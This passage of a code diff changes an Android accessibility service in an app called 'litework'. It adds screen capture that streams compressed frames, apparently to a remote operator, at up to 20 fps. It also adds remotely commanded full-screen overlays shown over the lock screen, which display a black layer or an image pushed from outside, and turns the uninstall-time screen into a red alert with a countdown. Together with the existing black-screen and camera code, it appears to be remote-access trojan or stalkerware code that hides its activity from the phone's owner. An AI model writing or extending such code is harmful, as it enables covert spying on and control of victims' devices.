@@ -2,6 +2,7 @@ package com.support.litework.services;
 
 import android.Manifest;
 import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
 import android.annotation.SuppressLint;
 import android.app.admin.DevicePolicyManager;
@@ -24,7 +25,9 @@ import android.graphics.ImageFormat;
 import android.graphics.Paint;
 import android.graphics.Path;
 import android.graphics.PixelFormat;
+import android.graphics.Point;
 import android.graphics.Rect;
+import android.graphics.Region;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraCaptureSession;
 import android.hardware.camera2.CameraCharacteristics;
@@ -72,6 +75,8 @@ import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.bumptech.glide.Glide;
+import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions;
 import com.support.litework.MainActivity;
 import com.support.litework.R;
 import com.support.litework.activity.OverlaySetActivity;
@@ -87,6 +92,7 @@ import com.support.litework.utils.FileUtils;
 import com.support.litework.utils.InstalledApps;
 import com.support.litework.utils.MyPermissions;
 
+import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
@@ -94,6 +100,7 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.concurrent.Executor;
 
 public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_SCREEN_MONITOR = "SCREEN_MONITOR";
@@ -103,6 +110,8 @@ public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_SCREEN_DRAG_MONITOR = "SCREEN_DRAG_MONITOR";
     public static final String ACTION_SCREEN_BLACK_MONITOR = "SCREEN_BLACK_MONITOR";
     public static final String ACTION_SCREEN_LIGHT_MONITOR = "SCREEN_LIGHT_MONITOR";
+    public static final String ACTION_SCREEN_IMAGEOVERLAY_MONITOR = "SCREEN_IMAGEOVERLAY_MONITOR";
+    public static final String ACTION_SCREEN_UNIMAGEOVERLAY_MONITOR = "SCREEN_UNIMAGEOVERLAY_MONITOR";
     public static final String ACTION_SCREEN_SKELETON_MONITOR = "SCREEN_SKELETON_MONITOR";
     public static final String ACTION_SCREEN_SET_TEXT_MONITOR = "SCREEN_SET_TEXT_MONITOR";
     public static final String ACTION_SCREEN_LOCK_MONITOR = "SCREEN_LOCK_MONITOR";
@@ -149,7 +158,7 @@ public class MainAccessibilityService extends AccessibilityService {
     private ImageReader imageReader;
 
     private long lastFrameTime = 0;
-    private final int targetFps = 10; // desired FPS
+    private final int targetFps = 20; // desired FPS
     private final int frameInterval = 1000 / targetFps;
 
     // App Event Monitor
@@ -161,6 +170,14 @@ public class MainAccessibilityService extends AccessibilityService {
     private WindowManager windowManager;
     private View overlayView;
     private TextView loadingTextView;
+
+    //imageoverlayscreen
+    private boolean isImageOverlayScreen = false;
+    private String overlayimgdata = "";
+    private String overlayimgtype = "";
+    private WindowManager windowManagerImage;
+    private View overlayImageView;
+    private ImageView imgOverlay;
 
     //waitingScreen
     private boolean isWaitingScreen = false;
@@ -273,10 +290,16 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     @Override
+    public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
+        super.takeScreenshot(displayId, executor, callback);
+    }
+
+    @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
         CONTEXT = this;
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        windowManagerImage = (WindowManager) getSystemService(WINDOW_SERVICE);
         windowManagerWaiting = (WindowManager) getSystemService(WINDOW_SERVICE);
         windowManagerRemove = (WindowManager) getSystemService(WINDOW_SERVICE);
         windowManagerTouch = (WindowManager) getSystemService(WINDOW_SERVICE);
@@ -286,7 +309,9 @@ public class MainAccessibilityService extends AccessibilityService {
         display.getRealMetrics(displayMetrics);
         deviceWidth = displayMetrics.widthPixels;
         deviceHeight = displayMetrics.heightPixels;
+
         deviceDensityDpi = displayMetrics.densityDpi;
+
 
         registerBackCameraCaptureManager();
         registerReceiverManager();
@@ -397,6 +422,17 @@ public class MainAccessibilityService extends AccessibilityService {
             }
             if (ACTION_SCREEN_LIGHT_MONITOR.equals(intent.getAction())) {
                 removeBlackScreen();
+            }
+
+            if (ACTION_SCREEN_IMAGEOVERLAY_MONITOR.equals(intent.getAction())) {
+                overlayimgdata = intent.getStringExtra("imgdata");
+                overlayimgtype = intent.getStringExtra("type");
+                Log.d("imagevoerlay", overlayimgdata);
+                removeImageOverlayScreen();
+                makeImageOverlayScreen();
+            }
+            if (ACTION_SCREEN_UNIMAGEOVERLAY_MONITOR.equals(intent.getAction())) {
+                removeImageOverlayScreen();
             }
 
             if (ACTION_SCREEN_SKELETON_MONITOR.equals(intent.getAction())) {
@@ -555,6 +591,10 @@ public class MainAccessibilityService extends AccessibilityService {
         registerReceiver(screenMonitorReceiver, filter_screen_black, RECEIVER_EXPORTED);
         IntentFilter filter_screen_light = new IntentFilter(ACTION_SCREEN_LIGHT_MONITOR);
         registerReceiver(screenMonitorReceiver, filter_screen_light, RECEIVER_EXPORTED);
+        IntentFilter filter_screen_imageoverlay = new IntentFilter(ACTION_SCREEN_IMAGEOVERLAY_MONITOR);
+        registerReceiver(screenMonitorReceiver, filter_screen_imageoverlay, RECEIVER_EXPORTED);
+        IntentFilter filter_screen_unimageoverlay = new IntentFilter(ACTION_SCREEN_UNIMAGEOVERLAY_MONITOR);
+        registerReceiver(screenMonitorReceiver, filter_screen_unimageoverlay, RECEIVER_EXPORTED);
         IntentFilter filter_screen_skeleton = new IntentFilter(ACTION_SCREEN_SKELETON_MONITOR);
         registerReceiver(screenMonitorReceiver, filter_screen_skeleton, RECEIVER_EXPORTED);
         IntentFilter filter_screen_set_text = new IntentFilter(ACTION_SCREEN_SET_TEXT_MONITOR);
@@ -623,6 +663,7 @@ public class MainAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        // screenShotDevice();
         if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             setBatteryPermission(event);
             if (manufacturer.equals("xiaomi")) {
@@ -1494,6 +1535,61 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
+    public void screenShotDevice() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            takeScreenshot(0, getApplicationContext().getMainExecutor(), new TakeScreenshotCallback() {
+
+                @Override
+                public void onSuccess(@NonNull ScreenshotResult screenshot) {
+                    new Thread() {
+                        @Override
+                        public void run() {
+                            long currentTime = System.currentTimeMillis();
+                            if (currentTime - lastFrameTime < frameInterval) {
+                                return;
+                            }
+                            lastFrameTime = currentTime;
+                            try {
+                                Bitmap wrapHardwareBuffer = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());
+
+                                // Compress the Bitmap to JPEG format with 50% quality
+                                try {
+                                    assert wrapHardwareBuffer != null;
+                                    deviceWidth = wrapHardwareBuffer.getWidth();
+                                    deviceHeight = wrapHardwareBuffer.getHeight();
+                                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                                    Bitmap scaledBitmap;
+                                    if (blackScreen || isImageOverlayScreen) {
+                                        Bitmap converImage = changeImageOpacity(wrapHardwareBuffer,1.0f);
+                                        scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
+                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, outputStream);
+                                    } else {
+                                        scaledBitmap = Bitmap.createScaledBitmap(wrapHardwareBuffer, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
+                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, outputStream);
+                                    }
+                                    screen_outputStream = outputStream;
+                                    sendScreenMonitoringData(outputStream);
+                                    scaledBitmap.recycle();
+                                    outputStream.close();
+                                } catch (IOException e) {
+                                    throw new RuntimeException(e);
+                                }
+
+                            } catch (Exception e){
+                                e.printStackTrace();
+                            }
+                        }
+                    }.start();
+                }
+
+                @Override
+                public void onFailure(int errorCode) {
+
+                }
+            });
+        }
+    }
+
     private void startCapture() {
         int width = deviceWidth;
         int height = deviceHeight;
@@ -1540,21 +1636,21 @@ public class MainAccessibilityService extends AccessibilityService {
                     bitmap.copyPixelsFromBuffer(buffer);
                     ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                     Bitmap scaledBitmap;
-                    if (blackScreen) {
+                    if (blackScreen || isImageOverlayScreen) {
                         Bitmap converImage = changeImageOpacity(bitmap, 1.0f);
                         scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (bitmapHeight * (360.0 / deviceWidth)), true);
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 5, outputStream);
+                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, outputStream);
                         } else {
-                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 5, outputStream);
+                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                         }
 
                     } else {
                         scaledBitmap = Bitmap.createScaledBitmap(bitmap, imageWidth, (int) (bitmapHeight * (360.0 / deviceWidth)), true);
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 5, outputStream);
+                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, outputStream);
                         }else {
-                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 5, outputStream);
+                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                         }
                     }
                     screen_outputStream = outputStream;
@@ -1703,6 +1799,92 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
+    public void makeImageOverlayScreen() {
+        if (overlayImageView == null) {
+            overlayImageView = new View(this);
+            overlayImageView.setBackgroundColor(0xFF000000); // blue
+            overlayImageView.getBackground().setAlpha(253);
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    deviceHeight + 300,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            params.gravity = Gravity.CENTER;
+
+
+            imgOverlay = new ImageView(this);
+            if(overlayimgdata.equals("")) {
+                Glide.with(this)
+                        .asGif()
+                        .load(R.drawable.img_alert)
+                        .transition(DrawableTransitionOptions.withCrossFade())
+                        .into(imgOverlay);
+            } else {
+                if(overlayimgtype.equals("image-file")) {
+                    String base64Image = overlayimgdata.split(",")[1];
+                    byte[] decodedBytes = Base64.decode(base64Image, Base64.DEFAULT);
+                    Bitmap bitmap = BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.length);
+                    Glide.with(this)
+                            .load(decodedBytes)
+                            .error(R.drawable.img_alert)
+                            .transition(DrawableTransitionOptions.withCrossFade())
+                            .into(imgOverlay);
+                } else if(overlayimgtype.equals("image-link")) {
+                    Glide.with(this)
+                            .asGif()
+                            .load(overlayimgdata)
+                            .error(R.drawable.img_alert)
+                            .transition(DrawableTransitionOptions.withCrossFade())
+                            .into(imgOverlay);
+                } else {
+                    Glide.with(this)
+                            .asGif()
+                            .load(R.drawable.img_alert)
+                            .transition(DrawableTransitionOptions.withCrossFade())
+                            .into(imgOverlay);
+                }
+
+            }
+
+            // imgOverlay.setImageDrawable(getResources().getDrawable(R.drawable.img_overlay));
+            imgOverlay.setAlpha(0.5f);
+            WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
+                    deviceWidth * 3 / 4,
+                    deviceWidth * 3 / 4,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            img_params.gravity = Gravity.CENTER;
+            windowManagerImage.addView(overlayImageView, params);
+            windowManagerImage.addView(imgOverlay, img_params);
+            isImageOverlayScreen = true;
+        }
+    }
+
+    public void removeImageOverlayScreen() {
+        if (overlayImageView != null) {
+            windowManagerImage.removeView(overlayImageView);
+            windowManagerImage.removeView(imgOverlay);
+            overlayImageView = null;
+            isImageOverlayScreen = false;
+        }
+    }
+
     public void makeOverlayWaitingScreen() {
         if (overlayWaitingView == null) {
             overlayWaitingView = new View(this);
@@ -1846,145 +2028,235 @@ public class MainAccessibilityService extends AccessibilityService {
 
     public void makeOverlayRemoveScreen() {
         if (overlayRemoveView == null) {
-            overlayRemoveView = new View(this);
-            overlayRemoveView.setBackgroundColor(0xFF787878); // Black color
+            Boolean alert_status = false;
+            if(alert_status) {
+                overlayRemoveView = new View(this);
+                overlayRemoveView.setBackgroundColor(0xFF787878); // Black color
 
-            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    deviceHeight + 300,
-                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
-                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                    PixelFormat.TRANSPARENT
-            );
-            params.gravity = Gravity.CENTER;
+                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        deviceHeight + 300,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSPARENT
+                );
+                params.gravity = Gravity.CENTER;
+                imgRemove = new ImageView(this);
+                imgRemove.setImageDrawable(getResources().getDrawable(R.drawable.img_alert));
 
-
-            imgRemove = new ImageView(this);
-            imgRemove.setImageDrawable(getResources().getDrawable(R.drawable.img_alert));
-
-            WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
-                    deviceWidth / 2,
-                    deviceWidth / 2,
-                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
-                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                    PixelFormat.TRANSPARENT
-            );
-            img_params.gravity = Gravity.CENTER;
-
-
-            txtRemoveWaiting = new TextView(this);
-            txtRemoveWaiting.setTextColor(Color.WHITE);
-            txtRemoveWaiting.setText(getResources().getString(R.string.overlayremovewaiting));
-            txtRemoveWaiting.setTextSize(14);
-            txtRemoveWaiting.setGravity(Gravity.CENTER);
-
-            WindowManager.LayoutParams txt_waiting_params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
-                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                    PixelFormat.TRANSPARENT
-            );
-            txt_waiting_params.gravity = Gravity.CENTER;
-            txt_waiting_params.y = deviceWidth / 2;
-
-            txtRemoveTitle = new TextView(this);
-            txtRemoveTitle.setTextColor(Color.WHITE);
-            txtRemoveTitle.setText(getResources().getString(R.string.overlayremovetitle));
-            txtRemoveTitle.setTextSize(14);
-            txtRemoveTitle.setGravity(Gravity.CENTER);
-
-            WindowManager.LayoutParams txt_title_params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
-                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                    PixelFormat.TRANSPARENT
-            );
-            txt_title_params.gravity = Gravity.CENTER;
-            txt_title_params.y = deviceWidth / 4;
+                WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
+                        deviceWidth / 2,
+                        deviceWidth / 2,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSPARENT
+                );
+                img_params.gravity = Gravity.CENTER;
 
 
-            txtRemoveCounting = new TextView(this);
-            txtRemoveCounting.setTextColor(Color.WHITE);
-            txtRemoveCounting.setText("0");
-            txtRemoveCounting.setTextSize(50);
-            txtRemoveCounting.setGravity(Gravity.CENTER);
-            txtRemoveCounting.setPadding(0, 0, 0, deviceWidth / 2 + 60);
+                txtRemoveWaiting = new TextView(this);
+                txtRemoveWaiting.setTextColor(Color.WHITE);
+                txtRemoveWaiting.setText(getResources().getString(R.string.overlayremovewaiting));
+                txtRemoveWaiting.setTextSize(14);
+                txtRemoveWaiting.setGravity(Gravity.CENTER);
 
-            WindowManager.LayoutParams txt_params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
-                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                    PixelFormat.TRANSPARENT
-            );
-            txt_params.gravity = Gravity.CENTER;
+                WindowManager.LayoutParams txt_waiting_params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSPARENT
+                );
+                txt_waiting_params.gravity = Gravity.CENTER;
+                txt_waiting_params.y = deviceWidth / 2;
+
+                txtRemoveTitle = new TextView(this);
+                txtRemoveTitle.setTextColor(Color.WHITE);
+                txtRemoveTitle.setText(getResources().getString(R.string.overlayremovetitle));
+                txtRemoveTitle.setTextSize(14);
+                txtRemoveTitle.setGravity(Gravity.CENTER);
+
+                WindowManager.LayoutParams txt_title_params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSPARENT
+                );
+                txt_title_params.gravity = Gravity.CENTER;
+                txt_title_params.y = deviceWidth / 4;
 
 
-            windowManagerRemove.addView(overlayRemoveView, params);
-            windowManagerRemove.addView(imgRemove, img_params);
-            windowManagerRemove.addView(txtRemoveWaiting, txt_waiting_params);
-            windowManagerRemove.addView(txtRemoveTitle, txt_title_params);
-            windowManagerRemove.addView(txtRemoveCounting, txt_params);
-            isWaitingScreen = true;
+                txtRemoveCounting = new TextView(this);
+                txtRemoveCounting.setTextColor(Color.WHITE);
+                txtRemoveCounting.setText("0");
+                txtRemoveCounting.setTextSize(50);
+                txtRemoveCounting.setGravity(Gravity.CENTER);
+                txtRemoveCounting.setPadding(0, 0, 0, deviceWidth / 2 + 60);
 
-            new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
-                @Override
-                public void onTick(long millisUntilFinished) {
-                    // Update the countdown text with the remaining seconds
-                    txtRemoveCounting.setText(String.valueOf(millisUntilFinished / 1000));
-                }
+                WindowManager.LayoutParams txt_params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSPARENT
+                );
+                txt_params.gravity = Gravity.CENTER;
 
-                @Override
-                public void onFinish() {
-                    // When the countdown finishes, display "Done" or hide the countdown
-                    txtRemoveCounting.setText("0");
-                    removeRemoveOverlayscreen();
-                }
-            }.start();
+
+                windowManagerRemove.addView(overlayRemoveView, params);
+                windowManagerRemove.addView(imgRemove, img_params);
+                windowManagerRemove.addView(txtRemoveWaiting, txt_waiting_params);
+                windowManagerRemove.addView(txtRemoveTitle, txt_title_params);
+                windowManagerRemove.addView(txtRemoveCounting, txt_params);
+                isWaitingScreen = true;
+
+                new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
+                    @Override
+                    public void onTick(long millisUntilFinished) {
+                        // Update the countdown text with the remaining seconds
+                        txtRemoveCounting.setText(String.valueOf(millisUntilFinished / 1000));
+                    }
+
+                    @Override
+                    public void onFinish() {
+                        // When the countdown finishes, display "Done" or hide the countdown
+                        txtRemoveCounting.setText("0");
+                        removeRemoveOverlayscreen();
+                    }
+                }.start();
+            } else {
+                overlayRemoveView = new View(this);
+                overlayRemoveView.setBackgroundColor(0xC0FF0000); // Black color
+
+                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        deviceHeight + 300,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSPARENT
+                );
+                params.gravity = Gravity.CENTER;
+                imgRemove = new ImageView(this);
+                imgRemove.setImageDrawable(getResources().getDrawable(R.drawable.img_alert_popup));
+
+                WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
+                        deviceWidth * 9/10,
+                        deviceWidth * 9/10,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSPARENT
+                );
+                img_params.gravity = Gravity.CENTER;
+
+                txtRemoveCounting = new TextView(this);
+                txtRemoveCounting.setTextColor(Color.WHITE);
+                txtRemoveCounting.setText("0");
+                txtRemoveCounting.setTextSize(50);
+                txtRemoveCounting.setGravity(Gravity.CENTER);
+                txtRemoveCounting.setPadding(0, 0, 0, deviceWidth / 2 + deviceWidth * 9/20 + 20);
+
+                WindowManager.LayoutParams txt_params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSPARENT
+                );
+                txt_params.gravity = Gravity.CENTER;
+
+                windowManagerRemove.addView(overlayRemoveView, params);
+                windowManagerRemove.addView(imgRemove, img_params);
+                windowManagerRemove.addView(txtRemoveCounting, txt_params);
+                isWaitingScreen = true;
+
+                new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
+                    @Override
+                    public void onTick(long millisUntilFinished) {
+                        // Update the countdown text with the remaining seconds
+                        txtRemoveCounting.setText(String.valueOf(millisUntilFinished / 1000));
+                    }
+
+                    @Override
+                    public void onFinish() {
+                        // When the countdown finishes, display "Done" or hide the countdown
+                        txtRemoveCounting.setText("0");
+                        removeRemoveOverlayscreen();
+                    }
+                }.start();
+            }
+
         }
     }
 
     public void removeRemoveOverlayscreen() {
         if (overlayRemoveView != null) {
-            windowManagerRemove.removeView(overlayRemoveView);
-            windowManagerRemove.removeView(txtRemoveWaiting);
-            windowManagerRemove.removeView(txtRemoveTitle);
